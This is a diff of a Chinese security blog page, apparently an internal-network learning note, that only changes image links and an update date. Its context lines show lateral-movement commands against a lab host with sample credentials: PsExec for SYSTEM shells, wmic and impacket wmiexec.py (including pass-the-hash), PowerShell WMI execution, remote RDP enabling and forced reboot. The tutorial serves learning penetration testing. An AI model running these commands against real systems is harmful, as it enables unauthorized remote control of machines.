@@ -271,7 +271,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902122716.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902122716.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -432,7 +432,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-09-02
+                    2021-11-22
                 </div>
                 
 
@@ -483,7 +483,7 @@ net use \\192.168.7.7 &#x2F;u:teamssix.com\administrator &quot;1qaz@WSX&quot;<sp
 <pre class="line-numbers language-none"><code class="language-none">-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框
 -s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902092309.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902092309.png"></p>
 <p>如果没有建立 ipc$ 连接，也可以直接使用 PsExec 指定用户名密码进行连接</p>
 <pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -521,7 +521,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator
 type \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902112523.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902112523.png"></p>
 <p>也可以预先建立 ipc$ 连接，再使用 wmic</p>
 <pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator
 wmic &#x2F;node:192.168.7.7 process call create &quot;cmd.exe &#x2F;c ipconfig &gt;c:\ip.txt&quot;
@@ -530,14 +530,14 @@ type \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><
 <h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h3><p>在 impacket 工具包里有 wmiexec.py 脚本，可以用来直接获取 shell</p>
 <pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902113920.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902113920.png"></p>
 <p>wmiexec.py 还支持通过哈希传递获得 shell</p>
 <pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py -hashes LMHash:NTHash 域名&#x2F;用户名@目标IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h3 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h3><p>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，wmiexec.vbs 下载地址：<a target="_blank" rel="noopener" href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a></p>
 <pre class="line-numbers language-none"><code class="language-none">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.7.7 administrator 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902122716.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902122716.png"></p>
 <p>使用 vmiexec.vbs 执行单条命令</p>
 <pre class="line-numbers language-none"><code class="language-none">cscript wmiexec.vbs &#x2F;cmd 192.168.7.7 administrator 1qaz@WSX &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -564,7 +564,7 @@ $Remote &#x3D; Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred
 # 将执行结果输出到屏幕上
 $Remote.PayloadOutput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902130614.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902130614.png"></p>
 <h3 id="Invoke-WMIMethod"><a href="#Invoke-WMIMethod" class="headerlink" title="Invoke-WMIMethod"></a>Invoke-WMIMethod</h3><p>Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接远程计算机执行命令和指定程序。</p>
 <pre class="line-numbers language-none"><code class="language-none"># 指定目标系统用户名
 $User&#x3D;&quot;teamssix.com\administrator&quot;
@@ -578,7 +578,7 @@ $Cred&#x3D;New-Object -TypeName System.Management.Automation.PSCredential -Argum
 # 在远程系统中运行 calc.exe 命令
 Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.7.7&quot; -Credential $Cred<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902131658.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902131658.png"></p>
 <p>可以看到在 192.168.7.7 主机中已经有进程 ID 为 3276 的 calc.exe 被执行了。</p>
 <h3 id="wmic-的其他命令"><a href="#wmic-的其他命令" class="headerlink" title="wmic 的其他命令"></a>wmic 的其他命令</h3><p>使用 wmic 远程开启目标的 RDP</p>
 <pre class="line-numbers language-none"><code class="language-none"># 适于 Windows xp、server 2003
@@ -592,7 +592,7 @@ wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX pro
 <p>判断 RDP 有没有开可以使用以下命令，如果返回 0 表示开启，返回 1 表示关闭。</p>
 <pre class="line-numbers language-none"><code class="language-none">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p> <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902135523.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p> <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902135523.png"></p>
 <p>使用 wmic 远程重启目标计算机</p>
 <pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &quot;shutdown.exe -r -f -t 0&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -602,7 +602,7 @@ wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX pro
 <p> <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/246440.html">https://www.freebuf.com/articles/246440.html</a></p>
 <p> 更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/TeamsSix_Subscription_Logo2.png"></p>
 
                 
             </div>
@@ -754,7 +754,7 @@ wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX pro
                 <a href="/210904-110701.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902171015.png" class="responsive-img" alt="【内网学习笔记】23、SMBExec 与 DCOM 的使用">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902171015.png" class="responsive-img" alt="【内网学习笔记】23、SMBExec 与 DCOM 的使用">
                         
                         <span class="card-title">【内网学习笔记】23、SMBExec 与 DCOM 的使用</span>
                     </div>
@@ -810,7 +810,7 @@ wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX pro
                 <a href="/210901-160349.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901154851.png" class="responsive-img" alt="【内网学习笔记】21、哈希传递与票据传递">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210901154851.png" class="responsive-img" alt="【内网学习笔记】21、哈希传递与票据传递">
                         
                         <span class="card-title">【内网学习笔记】21、哈希传递与票据传递</span>
                     </div>
